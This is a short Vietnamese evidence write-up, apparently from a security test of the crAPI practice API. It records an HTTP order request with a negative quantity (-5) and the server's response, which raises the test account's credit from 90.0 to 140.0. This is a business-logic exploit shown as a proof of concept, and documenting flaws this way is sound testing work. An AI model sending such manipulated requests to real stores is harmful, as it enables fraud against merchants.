# Bằng chứng — Vector A: quantity âm khi tạo đơn

Môi trường: crAPI 1.1.5 (commit `700f03d`). Token JWT đã được che.
Điều kiện: tài khoản thử đang có credit `90.0` sau khi mua 1 sản phẩm hợp lệ.

## Request

```http
POST /workshop/api/shop/orders HTTP/1.1
Authorization: Bearer <JWT redacted>
Content-Type: application/json

{"product_id":1,"quantity":-5}
```

## Response

```http
HTTP/1.1 200 OK

{"id":7,"message":"Order sent successfully.","credit":140.0}
```

## Trước / sau

| Thời điểm | Credit |
|---|---|
| Trước request | `90.0` |
| Sau request | `140.0` |

Đơn hàng `id=7` được tạo với `quantity=-5` và số dư **tăng 50.0** (5 × $10) thay vì bị
từ chối. Client tự thay đổi được số lượng — thuộc tính do server quản lý — để biến việc
mua hàng thành thao tác cộng credit.
